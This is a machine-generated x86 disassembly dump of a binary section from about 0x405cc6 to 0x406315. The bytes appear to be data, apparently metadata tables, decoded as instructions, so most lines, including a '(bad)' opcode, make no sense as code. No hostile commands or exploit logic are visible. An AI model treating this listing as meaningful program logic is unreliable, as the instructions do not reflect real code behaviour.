  405cc6:	6f                   	outsl  %ds:(%esi),(%dx)
  405cc7:	1e                   	push   %ds
  405cc8:	06                   	push   %es
  405cc9:	00 1a                	add    %bl,(%edx)
  405ccb:	26 2b 00             	sub    %es:(%eax),%eax
  405cce:	06                   	push   %es
  405ccf:	00 45 1d             	add    %al,0x1d(%ebp)
  405cd2:	c8 05 06 00          	enter  $0x605,$0x0
  405cd6:	4d                   	dec    %ebp
  405cd7:	15 c8 05 0a 00       	adc    $0xa05c8,%eax
  405cdc:	b6 0e                	mov    $0xe,%dh
  405cde:	6f                   	outsl  %ds:(%esi),(%dx)
  405cdf:	1e                   	push   %ds
  405ce0:	06                   	push   %es
  405ce1:	00 83 1a c8 05 0a    	add    %al,0xa05c81a(%ebx)
  405ce7:	00 d4                	add    %dl,%ah
  405ce9:	0e                   	push   %cs
  405cea:	6f                   	outsl  %ds:(%esi),(%dx)
  405ceb:	1e                   	push   %ds
  405cec:	06                   	push   %es
  405ced:	00 81 26 2b 00 16    	add    %al,0x16002b26(%ecx)
  405cf3:	00 a8 1f c6 0a 06    	add    %ch,0x60ac61f(%eax)
  405cf9:	00 7e 16             	add    %bh,0x16(%esi)
  405cfc:	2b 00                	sub    (%eax),%eax
  405cfe:	06                   	push   %es
  405cff:	00 86 0e c8 05 06    	add    %al,0x605c80e(%esi)
  405d05:	00 dc                	add    %bl,%ah
  405d07:	17                   	pop    %ss
  405d08:	c8 05 06 00          	enter  $0x605,$0x0
  405d0c:	67 0d c8 05 06 00    	addr16 or $0x605c8,%eax
  405d12:	52                   	push   %edx
  405d13:	1d c8 05 06 00       	sbb    $0x605c8,%eax
  405d18:	79 1a                	jns    0x405d34
  405d1a:	c8 05 16 00          	enter  $0x1605,$0x0
  405d1e:	92                   	xchg   %eax,%edx
  405d1f:	1a 82 1e 1a 00 f8    	sbb    -0x7ffe5e2(%edx),%al
  405d25:	1c 45                	sbb    $0x45,%al
  405d27:	22 1a                	and    (%edx),%bl
  405d29:	00 df                	add    %bl,%bh
  405d2b:	19 45 22             	sbb    %eax,0x22(%ebp)
  405d2e:	8b 01                	mov    (%ecx),%eax
  405d30:	a2 1d 00 00 1a       	mov    %al,0x1a00001d
  405d35:	00 48 21             	add    %cl,0x21(%eax)
  405d38:	45                   	inc    %ebp
  405d39:	22 06                	and    (%esi),%al
  405d3b:	00 29                	add    %ch,(%ecx)
  405d3d:	1e                   	push   %ds
  405d3e:	41                   	inc    %ecx
  405d3f:	18 06                	sbb    %al,(%esi)
  405d41:	00 46 00             	add    %al,0x0(%esi)
  405d44:	41                   	inc    %ecx
  405d45:	18 06                	sbb    %al,(%esi)
  405d47:	00 38                	add    %bh,(%eax)
  405d49:	18 41 18             	sbb    %al,0x18(%ecx)
  405d4c:	06                   	push   %es
  405d4d:	00 68 00             	add    %ch,0x0(%eax)
  405d50:	41                   	inc    %ecx
  405d51:	18 06                	sbb    %al,(%esi)
  405d53:	00 3f                	add    %bh,(%edi)
  405d55:	1c 26                	sbb    $0x26,%al
  405d57:	26 06                	es push %es
  405d59:	00 6f 18             	add    %ch,0x18(%edi)
  405d5c:	26 26 06             	es es push %es
  405d5f:	00 6d 0f             	add    %ch,0xf(%ebp)
  405d62:	41                   	inc    %ecx
  405d63:	18 06                	sbb    %al,(%esi)
  405d65:	00 10                	add    %dl,(%eax)
  405d67:	19 41 18             	sbb    %eax,0x18(%ecx)
  405d6a:	1e                   	push   %ds
  405d6b:	00 88 19 06 20 06    	add    %cl,0x6200619(%eax)
  405d71:	00 b8 26 15 17 06    	add    %bh,0x6171526(%eax)
  405d77:	00 2f                	add    %ch,(%edi)
  405d79:	17                   	pop    %ss
  405d7a:	15 17 06 00 94       	adc    $0x94000617,%eax
  405d7f:	0e                   	push   %cs
  405d80:	15 17 06 00 b9       	adc    $0xb9000617,%eax
  405d85:	0b 41 18             	or     0x18(%ecx),%eax
  405d88:	06                   	push   %es
  405d89:	00 72 0e             	add    %dh,0xe(%edx)
  405d8c:	7a 13                	jp     0x405da1
  405d8e:	0a 00                	or     (%eax),%al
  405d90:	11 1d 2b 00 0a 00    	adc    %ebx,0xa002b
  405d96:	c6                   	(bad)
  405d97:	20 2b                	and    %ch,(%ebx)
  405d99:	00 06                	add    %al,(%esi)
  405d9b:	00 f8                	add    %bh,%al
  405d9d:	0c 2b                	or     $0x2b,%al
  405d9f:	00 43 00             	add    %al,0x0(%ebx)
  405da2:	df 1d 00 00 12 00    	fistps 0x120000
  405da8:	00 0e                	add    %cl,(%esi)
  405daa:	a9 1b 06 00 0b       	test   $0xb00061b,%eax
  405daf:	00 ab 0a 06 00 27    	add    %ch,0x2700060a(%ebx)
  405db5:	19 41 18             	sbb    %eax,0x18(%ecx)
  405db8:	06                   	push   %es
  405db9:	00 43 26             	add    %al,0x26(%ebx)
  405dbc:	b3 19                	mov    $0x19,%bl
  405dbe:	06                   	push   %es
  405dbf:	00 e3                	add    %ah,%bl
  405dc1:	0f 41 18             	cmovno (%eax),%ebx
  405dc4:	06                   	push   %es
  405dc5:	00 ea                	add    %ch,%dl
  405dc7:	1d 41 18 06 00       	sbb    $0x61841,%eax
  405dcc:	4e                   	dec    %esi
  405dcd:	0e                   	push   %cs
  405dce:	41                   	inc    %ecx
  405dcf:	18 22                	sbb    %ah,(%edx)
  405dd1:	00 9f 1a 98 1c 22    	add    %bl,0x221c981a(%edi)
  405dd7:	00 7e 1f             	add    %bh,0x1f(%esi)
  405dda:	98                   	cwtl
  405ddb:	1c 22                	sbb    $0x22,%al
  405ddd:	00 bf 1c 98 1c 12    	add    %bh,0x121c981c(%edi)
  405de3:	00 b7 1c bf 1e 22    	add    %dh,0x221ebf1c(%edi)
  405de9:	00 96 1f 98 1c 06    	add    %dl,0x61c981f(%esi)
  405def:	00 55 1f             	add    %dl,0x1f(%ebp)
  405df2:	26 26 06             	es es push %es
  405df5:	00 34 1a             	add    %dh,(%edx,%ebx,1)
  405df8:	41                   	inc    %ecx
  405df9:	18 06                	sbb    %al,(%esi)
  405dfb:	00 5c 1f 26          	add    %bl,0x26(%edi,%ebx,1)
  405dff:	26 12 00             	adc    %es:(%eax),%al
  405e02:	71 1c                	jno    0x405e20
  405e04:	26 26 06             	es es push %es
  405e07:	00 ff                	add    %bh,%bh
  405e09:	17                   	pop    %ss
  405e0a:	26 26 06             	es es push %es
  405e0d:	00 7f 00             	add    %bh,0x0(%edi)
  405e10:	26 26 06             	es es push %es
  405e13:	00 1e                	add    %bl,(%esi)
  405e15:	1a 41 18             	sbb    0x18(%ecx),%al
  405e18:	06                   	push   %es
  405e19:	00 48 18             	add    %cl,0x18(%eax)
  405e1c:	26 26 06             	es es push %es
  405e1f:	00 ac 0d 26 26 06 00 	add    %ch,0x62626(%ebp,%ecx,1)
  405e26:	70 0d                	jo     0x405e35
  405e28:	26 26 06             	es es push %es
  405e2b:	00 a4 18 26 26 06 00 	add    %ah,0x62626(%eax,%ebx,1)
  405e32:	8b 0d 26 26 06 00    	mov    0x62626,%ecx
  405e38:	07                   	pop    %es
  405e39:	1a 26                	sbb    (%esi),%ah
  405e3b:	26 06                	es push %es
  405e3d:	00 d5                	add    %dl,%ch
  405e3f:	1c 41                	sbb    $0x41,%al
  405e41:	18 06                	sbb    %al,(%esi)
  405e43:	00 de                	add    %bl,%dh
  405e45:	25 41 18 06 00       	and    $0x61841,%eax
  405e4a:	5f                   	pop    %edi
  405e4b:	20 bf 1e 06 00 2b    	and    %bh,0x2b00061e(%edi)
  405e51:	0e                   	push   %cs
  405e52:	41                   	inc    %ecx
  405e53:	18 06                	sbb    %al,(%esi)
  405e55:	00 79 0b             	add    %bh,0xb(%ecx)
  405e58:	26 26 06             	es es push %es
  405e5b:	00 5f 00             	add    %bl,0x0(%edi)
  405e5e:	41                   	inc    %ecx
  405e5f:	18 06                	sbb    %al,(%esi)
  405e61:	00 19                	add    %bl,(%ecx)
  405e63:	0e                   	push   %cs
  405e64:	41                   	inc    %ecx
  405e65:	18 06                	sbb    %al,(%esi)
  405e67:	00 7f 0e             	add    %bh,0xe(%edi)
  405e6a:	41                   	inc    %ecx
  405e6b:	18 06                	sbb    %al,(%esi)
  405e6d:	00 7e 20             	add    %bh,0x20(%esi)
  405e70:	c8 05 06 00          	enter  $0x605,$0x0
  405e74:	e8 0f c8 05 0a       	call   0xa462688
  405e79:	00 0c 18             	add    %cl,(%eax,%ebx,1)
  405e7c:	72 19                	jb     0x405e97
  405e7e:	0a 00                	or     (%eax),%al
  405e80:	9c                   	pushf
  405e81:	0d 72 19 00 00       	or     $0x1972,%eax
  405e86:	00 00                	add    %al,(%eax)
  405e88:	93                   	xchg   %eax,%ebx
  405e89:	00 00                	add    %al,(%eax)
  405e8b:	00 00                	add    %al,(%eax)
  405e8d:	00 01                	add    %al,(%ecx)
  405e8f:	00 01                	add    %al,(%ecx)
  405e91:	00 01                	add    %al,(%ecx)
  405e93:	00 10                	add    %dl,(%eax)
  405e95:	00 bb 02 95 24 05    	add    %bh,0x5249502(%ebx)
  405e9b:	00 01                	add    %al,(%ecx)
  405e9d:	00 01                	add    %al,(%ecx)
  405e9f:	00 81 01 10 00 de    	add    %al,-0x21ffefff(%ecx)
  405ea5:	02 95 24 05 00 01    	add    0x1000524(%ebp),%dl
  405eab:	00 03                	add    %al,(%ebx)
  405ead:	00 81 01 10 00 65    	add    %al,0x65001001(%ecx)
  405eb3:	07                   	pop    %es
  405eb4:	6d                   	insl   (%dx),%es:(%edi)
  405eb5:	25 05 00 13 00       	and    $0x130005,%eax
  405eba:	06                   	push   %es
  405ebb:	00 00                	add    %al,(%eax)
  405ebd:	00 10                	add    %dl,(%eax)
  405ebf:	00 1f                	add    %bl,(%edi)
  405ec1:	0a 42 0a             	or     0xa(%edx),%al
  405ec4:	05 00 1e 00 24       	add    $0x24001e00,%eax
  405ec9:	00 00                	add    %al,(%eax)
  405ecb:	00 10                	add    %dl,(%eax)
  405ecd:	00 3e                	add    %bh,(%esi)
  405ecf:	1e                   	push   %ds
  405ed0:	1d 05 05 00 1e       	sbb    $0x1e000505,%eax
  405ed5:	00 26                	add    %ah,(%esi)
  405ed7:	00 81 01 10 00 03    	add    %al,0x3001001(%ecx)
  405edd:	24 1d                	and    $0x1d,%al
  405edf:	05 05 00 1e 00       	add    $0x1e0005,%eax
  405ee4:	2d 00 81 01 10       	sub    $0x10018100,%eax
  405ee9:	00 3b                	add    %bh,(%ebx)
  405eeb:	05 1d 05 05 00       	add    $0x5051d,%eax
  405ef0:	1e                   	push   %ds
  405ef1:	00 2f                	add    %ch,(%edi)
  405ef3:	00 81 01 10 00 ec    	add    %al,-0x13ffefff(%ecx)
  405ef9:	14 1d                	adc    $0x1d,%al
  405efb:	05 05 00 1e 00       	add    $0x1e0005,%eax
  405f00:	30 00                	xor    %al,(%eax)
  405f02:	81 01 10 00 11 09    	addl   $0x9110010,(%ecx)
  405f08:	1d 05 05 00 1e       	sbb    $0x1e000505,%eax
  405f0d:	00 36                	add    %dh,(%esi)
  405f0f:	00 81 01 10 00 b8    	add    %al,-0x47ffefff(%ecx)
  405f15:	07                   	pop    %es
  405f16:	1d 05 05 00 1f       	sbb    $0x1f000505,%eax
  405f1b:	00 38                	add    %bh,(%eax)
  405f1d:	00 02                	add    %al,(%edx)
  405f1f:	01 00                	add    %eax,(%eax)
  405f21:	00 33                	add    %dh,(%ebx)
  405f23:	24 00                	and    $0x0,%al
  405f25:	00 39                	add    %bh,(%ecx)
  405f27:	00 1f                	add    %bl,(%edi)
  405f29:	00 3e                	add    %bh,(%esi)
  405f2b:	00 81 01 10 00 b9    	add    %al,-0x46ffefff(%ecx)
  405f31:	05 1d 05 05 00       	add    $0x5051d,%eax
  405f36:	23 00                	and    (%eax),%eax
  405f38:	3e 00 81 01 10 00 20 	add    %al,%ds:0x20001001(%ecx)
  405f3f:	16                   	push   %ss
  405f40:	1d 05 05 00 23       	sbb    $0x23000505,%eax
  405f45:	00 41 00             	add    %al,0x0(%ecx)
  405f48:	81 01 10 00 5f 0a    	addl   $0xa5f0010,(%ecx)
  405f4e:	77 24                	ja     0x405f74
  405f50:	05 00 24 00 46       	add    $0x46002400,%eax
  405f55:	00 83 01 10 00 b7    	add    %al,-0x48ffefff(%ebx)
  405f5b:	16                   	push   %ss
  405f5c:	00 00                	add    %al,(%eax)
  405f5e:	05 00 25 00 4b       	add    $0x4b002500,%eax
  405f63:	00 01                	add    %al,(%ecx)
  405f65:	00 10                	add    %dl,(%eax)
  405f67:	00 46 1b             	add    %al,0x1b(%esi)
  405f6a:	9a 03 05 00 26 00 4b 	lcall  $0x4b00,$0x26000503
  405f71:	00 81 01 10 00 dc    	add    %al,-0x23ffefff(%ecx)
  405f77:	12 9a 03 05 00 2d    	adc    0x2d000503(%edx),%bl
  405f7d:	00 52 00             	add    %dl,0x0(%edx)
  405f80:	00 01                	add    %al,(%ecx)
  405f82:	00 00                	add    %al,(%eax)
  405f84:	0b 1b                	or     (%ebx),%ebx
  405f86:	00 00                	add    %al,(%eax)
  405f88:	05 00 2d 00 54       	add    $0x54002d00,%eax
  405f8d:	00 13                	add    %dl,(%ebx)
  405f8f:	01 00                	add    %eax,(%eax)
  405f91:	00 72 03             	add    %dh,0x3(%edx)
  405f94:	00 00                	add    %al,(%eax)
  405f96:	51                   	push   %ecx
  405f97:	00 2e                	add    %ch,(%esi)
  405f99:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  405f9d:	00 10                	add    %dl,(%eax)
  405f9f:	00 9e 04 b3 24 05    	add    %bl,0x524b304(%esi)
  405fa5:	00 2e                	add    %ch,(%esi)
  405fa7:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  405fab:	00 10                	add    %dl,(%eax)
  405fad:	00 e3                	add    %ah,%bl
  405faf:	03 b3 24 05 00 2f    	add    0x2f000524(%ebx),%esi
  405fb5:	00 5f 00             	add    %bl,0x0(%edi)
  405fb8:	01 00                	add    %eax,(%eax)
  405fba:	10 00                	adc    %al,(%eax)
  405fbc:	40                   	inc    %eax
  405fbd:	13 b3 24 05 00 31    	adc    0x31000524(%ebx),%esi
  405fc3:	00 63 00             	add    %ah,0x0(%ebx)
  405fc6:	01 00                	add    %eax,(%eax)
  405fc8:	10 00                	adc    %al,(%eax)
  405fca:	d0 1a                	rcrb   $1,(%edx)
  405fcc:	b3 24                	mov    $0x24,%bl
  405fce:	05 00 33 00 6a       	add    $0x6a003300,%eax
  405fd3:	00 01                	add    %al,(%ecx)
  405fd5:	01 00                	add    %eax,(%eax)
  405fd7:	00 08                	add    %cl,(%eax)
  405fd9:	27                   	daa
  405fda:	b3 24                	mov    $0x24,%bl
  405fdc:	39 00                	cmp    %eax,(%eax)
  405fde:	3a 00                	cmp    (%eax),%al
  405fe0:	95                   	xchg   %eax,%ebp
  405fe1:	00 00                	add    %al,(%eax)
  405fe3:	00 10                	add    %dl,(%eax)
  405fe5:	00 7c 25 b3          	add    %bh,-0x4d(%ebp,%eiz,1)
  405fe9:	24 05                	and    $0x5,%al
  405feb:	00 47 00             	add    %al,0x0(%edi)
  405fee:	95                   	xchg   %eax,%ebp
  405fef:	00 00                	add    %al,(%eax)
  405ff1:	00 10                	add    %dl,(%eax)
  405ff3:	00 30                	add    %dh,(%eax)
  405ff5:	04 b3                	add    $0xb3,%al
  405ff7:	24 05                	and    $0x5,%al
  405ff9:	00 47 00             	add    %al,0x0(%edi)
  405ffc:	99                   	cltd
  405ffd:	00 81 01 10 00 20    	add    %al,0x20001001(%ecx)
  406003:	03 b3 24 05 00 47    	add    0x47000524(%ebx),%esi
  406009:	00 a2 00 00 01 00    	add    %ah,0x10000(%edx)
  40600f:	00 a7 09 00 00 05    	add    %ah,0x5000009(%edi)
  406015:	00 47 00             	add    %al,0x0(%edi)
  406018:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406019:	00 13                	add    %dl,(%ebx)
  40601b:	01 00                	add    %eax,(%eax)
  40601d:	00 9b 05 00 00 51    	add    %bl,0x51000005(%ebx)
  406023:	00 48 00             	add    %cl,0x0(%eax)
  406026:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406027:	00 16                	add    %dl,(%esi)
  406029:	00 c1                	add    %al,%cl
  40602b:	17                   	pop    %ss
  40602c:	12 00                	adc    (%eax),%al
  40602e:	16                   	push   %ss
  40602f:	00 68 09             	add    %ch,0x9(%eax)
  406032:	12 00                	adc    (%eax),%al
  406034:	16                   	push   %ss
  406035:	00 09                	add    %cl,(%ecx)
  406037:	03 12                	add    (%edx),%edx
  406039:	00 16                	add    %dl,(%esi)
  40603b:	00 6f 01             	add    %ch,0x1(%edi)
  40603e:	12 00                	adc    (%eax),%al
  406040:	16                   	push   %ss
  406041:	00 f3                	add    %dh,%bl
  406043:	06                   	push   %es
  406044:	12 00                	adc    (%eax),%al
  406046:	16                   	push   %ss
  406047:	00 55 1b             	add    %dl,0x1b(%ebp)
  40604a:	12 00                	adc    (%eax),%al
  40604c:	16                   	push   %ss
  40604d:	00 d6                	add    %dl,%dh
  40604f:	06                   	push   %es
  406050:	12 00                	adc    (%eax),%al
  406052:	16                   	push   %ss
  406053:	00 ec                	add    %ch,%ah
  406055:	02 12                	add    (%edx),%dl
  406057:	00 16                	add    %dl,(%esi)
  406059:	00 77 0a             	add    %dh,0xa(%edi)
  40605c:	12 00                	adc    (%eax),%al
  40605e:	16                   	push   %ss
  40605f:	00 f9                	add    %bh,%cl
  406061:	08 12                	or     %dl,(%edx)
  406063:	00 16                	add    %dl,(%esi)
  406065:	00 4f 0a             	add    %cl,0xa(%edi)
  406068:	15 00 16 00 cb       	adc    $0xcb001600,%eax
  40606d:	24 12                	and    $0x12,%al
  40606f:	00 16                	add    %dl,(%esi)
  406071:	00 b0 17 19 00 16    	add    %dh,0x16001917(%eax)
  406077:	00 c8                	add    %cl,%al
  406079:	00 12                	add    %dl,(%edx)
  40607b:	00 16                	add    %dl,(%esi)
  40607d:	00 d3                	add    %dl,%bl
  40607f:	0d 12 00 16 00       	or     $0x160012,%eax
  406084:	5d                   	pop    %ebp
  406085:	01 12                	add    %edx,(%edx)
  406087:	00 16                	add    %dl,(%esi)
  406089:	00 b7 14 12 00 16    	add    %dh,0x16001214(%edi)
  40608f:	00 af 23 12 00 11    	add    %ch,0x11001223(%edi)
  406095:	00 d6                	add    %dl,%dh
  406097:	0c 21                	or     $0x21,%al
  406099:	00 11                	add    %dl,(%ecx)
  40609b:	00 bb 0c 25 00 11    	add    %bh,0x1100250c(%ebx)
  4060a1:	00 8b 0c 29 00 11    	add    %cl,0x1100290c(%ebx)
  4060a7:	00 21                	add    %ah,(%ecx)
  4060a9:	0c 2d                	or     $0x2d,%al
  4060ab:	00 11                	add    %dl,(%ecx)
  4060ad:	00 a3 0c 2d 00 11    	add    %ah,0x11002d0c(%ebx)
  4060b3:	00 06                	add    %al,(%esi)
  4060b5:	0c 30                	or     $0x30,%al
  4060b7:	00 11                	add    %dl,(%ecx)
  4060b9:	00 e9                	add    %ch,%cl
  4060bb:	0b 34 00             	or     (%eax,%eax,1),%esi
  4060be:	31 00                	xor    %eax,(%eax)
  4060c0:	cf                   	iret
  4060c1:	0b 37                	or     (%edi),%esi
  4060c3:	00 11                	add    %dl,(%ecx)
  4060c5:	00 3d 0c 30 00 11    	add    %bh,0x1100300c
  4060cb:	00 71 0c             	add    %dh,0xc(%ecx)
  4060ce:	3a 00                	cmp    (%eax),%al
  4060d0:	11 00                	adc    %eax,(%eax)
  4060d2:	53                   	push   %ebx
  4060d3:	0c 34                	or     $0x34,%al
  4060d5:	00 16                	add    %dl,(%esi)
  4060d7:	00 0f                	add    %cl,(%edi)
  4060d9:	05 dc 00 06 06       	add    $0x60600dc,%eax
  4060de:	9f                   	lahf
  4060df:	09 06                	or     %eax,(%esi)
  4060e1:	01 56 80             	add    %edx,-0x80(%esi)
  4060e4:	f5                   	cmc
  4060e5:	23 09                	and    (%ecx),%ecx
  4060e7:	01 56 80             	add    %edx,-0x80(%esi)
  4060ea:	a8 14                	test   $0x14,%al
  4060ec:	09 01                	or     %eax,(%ecx)
  4060ee:	56                   	push   %esi
  4060ef:	80 b1 25 09 01 31 00 	xorb   $0x0,0x31010925(%ecx)
  4060f6:	7e 05                	jle    0x4060fd
  4060f8:	12 00                	adc    (%eax),%al
  4060fa:	16                   	push   %ss
  4060fb:	00 85 1d 30 01 16    	add    %al,0x1601301d(%ebp)
  406101:	00 46 05             	add    %al,0x5(%esi)
  406104:	43                   	inc    %ebx
  406105:	01 51 80             	add    %edx,-0x80(%ecx)
  406108:	46                   	inc    %esi
  406109:	03 3a                	add    (%edx),%edi
  40610b:	00 51 80             	add    %dl,-0x80(%ecx)
  40610e:	58                   	pop    %eax
  40610f:	07                   	pop    %es
  406110:	3a 00                	cmp    (%eax),%al
  406112:	51                   	push   %ecx
  406113:	80 a2 17 3a 00 51 80 	andb   $0x80,0x51003a17(%edx)
  40611a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40611b:	24 3a                	and    $0x3a,%al
  40611d:	00 21                	add    %ah,(%ecx)
  40611f:	00 5f 02             	add    %bl,0x2(%edi)
  406122:	29 00                	sub    %eax,(%eax)
  406124:	21 00                	and    %eax,(%eax)
  406126:	d7                   	xlat   %ds:(%ebx)
  406127:	24 29                	and    $0x29,%al
  406129:	00 31                	add    %dh,(%ecx)
  40612b:	00 85 09 29 00 33    	add    %al,0x33002909(%ebp)
  406131:	01 dd                	add    %ebx,%ebp
  406133:	15 8b 01 11 00       	adc    $0x11018b,%eax
  406138:	ea 15 8f 01 01 00 a1 	ljmp   $0xa100,$0x1018f15
  40613f:	02 30                	add    (%eax),%dh
  406141:	01 01                	add    %eax,(%ecx)
  406143:	00 92 06 3a 00 01    	add    %dl,0x1003a06(%edx)
  406149:	00 a1 02 30 01 01    	add    %ah,0x1013002(%ecx)
  40614f:	00 4a 08             	add    %cl,0x8(%edx)
  406152:	c7 01 01 00 09 01    	movl   $0x1090001,(%ecx)
  406158:	12 00                	adc    (%eax),%al
  40615a:	01 00                	add    %eax,(%eax)
  40615c:	6b 04 12 00          	imul   $0x0,(%edx,%edx,1),%eax
  406160:	01 00                	add    %eax,(%eax)
  406162:	8d 07                	lea    (%edi),%eax
  406164:	37                   	aaa
  406165:	00 01                	add    %al,(%ecx)
  406167:	00 f4                	add    %dh,%ah
  406169:	0d 02 02 01 00       	or     $0x10202,%eax
  40616e:	11 24 c7             	adc    %esp,(%edi,%eax,8)
  406171:	01 01                	add    %eax,(%ecx)
  406173:	00 a1 02 30 01 01    	add    %ah,0x1013002(%ecx)
  406179:	00 04 08             	add    %al,(%eax,%ecx,1)
  40617c:	06                   	push   %es
  40617d:	02 06                	add    (%esi),%al
  40617f:	06                   	push   %es
  406180:	9f                   	lahf
  406181:	09 3a                	or     %edi,(%edx)
  406183:	00 56 80             	add    %dl,-0x80(%esi)
  406186:	cf                   	iret
  406187:	1b 02                	sbb    (%edx),%eax
  406189:	02 56 80             	add    -0x80(%esi),%dl
  40618c:	05 09 02 02 56       	add    $0x56020209,%eax
  406191:	80 96 17 02 02 56 80 	adcb   $0x80,0x56020217(%esi)
  406198:	e2 00                	loop   0x40619a
  40619a:	02 02                	add    (%edx),%al
  40619c:	56                   	push   %esi
  40619d:	80 d6 26             	adc    $0x26,%dh
  4061a0:	02 02                	add    (%edx),%al
  4061a2:	56                   	push   %esi
  4061a3:	80 2e 09             	subb   $0x9,(%esi)
  4061a6:	02 02                	add    (%edx),%al
  4061a8:	56                   	push   %esi
  4061a9:	80 a9 03 02 02 56 80 	subb   $0x80,0x56020203(%ecx)
  4061b0:	32 08                	xor    (%eax),%cl
  4061b2:	02 02                	add    (%edx),%al
  4061b4:	56                   	push   %esi
  4061b5:	80 c6 18             	add    $0x18,%dh
  4061b8:	02 02                	add    (%edx),%al
  4061ba:	56                   	push   %esi
  4061bb:	80 23 24             	andb   $0x24,(%ebx)
  4061be:	02 02                	add    (%edx),%al
  4061c0:	56                   	push   %esi
  4061c1:	80 2d 07 02 02 56 80 	subb   $0x80,0x56020207
  4061c8:	46                   	inc    %esi
  4061c9:	02 02                	add    (%edx),%al
  4061cb:	02 33                	add    (%ebx),%dh
  4061cd:	01 84 06 fd 02 08 26 	add    %eax,0x260802fd(%esi,%eax,1)
  4061d4:	00 00                	add    %al,(%eax)
  4061d6:	00 00                	add    %al,(%eax)
  4061d8:	96                   	xchg   %eax,%esi
  4061d9:	00 18                	add    %bl,(%eax)
  4061db:	19 0a                	sbb    %ecx,(%edx)
  4061dd:	00 01                	add    %al,(%ecx)
  4061df:	00 78 20             	add    %bh,0x20(%eax)
  4061e2:	00 00                	add    %al,(%eax)
  4061e4:	00 00                	add    %al,(%eax)
  4061e6:	86 18                	xchg   %bl,(%eax)
  4061e8:	f4                   	hlt
  4061e9:	1d 0e 00 01 00       	sbb    $0x1000e,%eax
  4061ee:	f8                   	clc
  4061ef:	26 00 00             	add    %al,%es:(%eax)
  4061f2:	00 00                	add    %al,(%eax)
  4061f4:	96                   	xchg   %eax,%esi
  4061f5:	00 ed                	add    %ch,%ch
  4061f7:	07                   	pop    %es
  4061f8:	1d 00 01 00 50       	sbb    $0x50000100,%eax
  4061fd:	28 00                	sub    %al,(%eax)
  4061ff:	00 00                	add    %al,(%eax)
  406201:	00 91 00 4b 06 1d    	add    %dl,0x1d064b00(%ecx)
  406207:	00 01                	add    %al,(%ecx)
  406209:	00 c0                	add    %al,%al
  40620b:	28 00                	sub    %al,(%eax)
  40620d:	00 00                	add    %al,(%eax)
  40620f:	00 91 18 fa 1d 0a    	add    %dl,0xa1dfa18(%ecx)
  406215:	00 01                	add    %al,(%ecx)
  406217:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  40621d:	00 96 08 14 22 3d    	add    %dl,0x3d221408(%esi)
  406223:	00 01                	add    %al,(%ecx)
  406225:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  40622b:	00 96 08 22 22 42    	add    %dl,0x42222208(%esi)
  406231:	00 01                	add    %al,(%ecx)
  406233:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  406239:	00 96 08 f8 21 48    	add    %dl,0x4821f808(%esi)
  40623f:	00 02                	add    %al,(%edx)
  406241:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  406247:	00 96 08 06 22 4d    	add    %dl,0x4d220608(%esi)
  40624d:	00 02                	add    %al,(%edx)
  40624f:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  406255:	00 91 08 c6 1c 53    	add    %dl,0x531cc608(%ecx)
  40625b:	00 03                	add    %al,(%ebx)
  40625d:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  406263:	00 91 08 d1 1c 58    	add    %dl,0x581cd108(%ecx)
  406269:	00 03                	add    %al,(%ebx)
  40626b:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  406271:	00 91 08 6f 12 5e    	add    %dl,0x5e126f08(%ecx)
  406277:	00 04 00             	add    %al,(%eax,%eax,1)
  40627a:	b4 20                	mov    $0x20,%ah
  40627c:	00 00                	add    %al,(%eax)
  40627e:	00 00                	add    %al,(%eax)
  406280:	91                   	xchg   %eax,%ecx
  406281:	08 7e 12             	or     %bh,0x12(%esi)
  406284:	62 00                	bound  %eax,(%eax)
  406286:	04 00                	add    $0x0,%al
  406288:	bc 20 00 00 00       	mov    $0x20,%esp
  40628d:	00 91 08 af 21 5e    	add    %dl,0x5e21af08(%ecx)
  406293:	00 05 00 c3 20 00    	add    %al,0x20c300
  406299:	00 00                	add    %al,(%eax)
  40629b:	00 91 08 ba 21 62    	add    %dl,0x6221ba08(%ecx)
  4062a1:	00 05 00 cb 20 00    	add    %al,0x20cb00
  4062a7:	00 00                	add    %al,(%eax)
  4062a9:	00 91 08 30 12 67    	add    %dl,0x67123008(%ecx)
  4062af:	00 06                	add    %al,(%esi)
  4062b1:	00 d2                	add    %dl,%dl
  4062b3:	20 00                	and    %al,(%eax)
  4062b5:	00 00                	add    %al,(%eax)
  4062b7:	00 91 08 3e 12 6c    	add    %dl,0x6c123e08(%ecx)
  4062bd:	00 06                	add    %al,(%esi)
  4062bf:	00 da                	add    %bl,%dl
  4062c1:	20 00                	and    %al,(%eax)
  4062c3:	00 00                	add    %al,(%eax)
  4062c5:	00 96 08 95 0b 1d    	add    %dl,0x1d0b9508(%esi)
  4062cb:	00 07                	add    %al,(%edi)
  4062cd:	00 e1                	add    %ah,%cl
  4062cf:	20 00                	and    %al,(%eax)
  4062d1:	00 00                	add    %al,(%eax)
  4062d3:	00 96 08 a5 0b 72    	add    %dl,0x720ba508(%esi)
  4062d9:	00 07                	add    %al,(%edi)
  4062db:	00 e9                	add    %ch,%cl
  4062dd:	20 00                	and    %al,(%eax)
  4062df:	00 00                	add    %al,(%eax)
  4062e1:	00 91 08 dc 0a 77    	add    %dl,0x770adc08(%ecx)
  4062e7:	00 08                	add    %cl,(%eax)
  4062e9:	00 f0                	add    %dh,%al
  4062eb:	20 00                	and    %al,(%eax)
  4062ed:	00 00                	add    %al,(%eax)
  4062ef:	00 91 08 68 13 67    	add    %dl,0x67136808(%ecx)
  4062f5:	00 08                	add    %cl,(%eax)
  4062f7:	00 f7                	add    %dh,%bh
  4062f9:	20 00                	and    %al,(%eax)
  4062fb:	00 00                	add    %al,(%eax)
  4062fd:	00 91 08 71 13 6c    	add    %dl,0x6c137108(%ecx)
  406303:	00 08                	add    %cl,(%eax)
  406305:	00 ff                	add    %bh,%bh
  406307:	20 00                	and    %al,(%eax)
  406309:	00 00                	add    %al,(%eax)
  40630b:	00 96 08 40 17 7b    	add    %dl,0x7b174008(%esi)
  406311:	00 09                	add    %cl,(%ecx)
  406313:	00 06                	add    %al,(%esi)
  406315:	21 00                	and    %eax,(%eax)
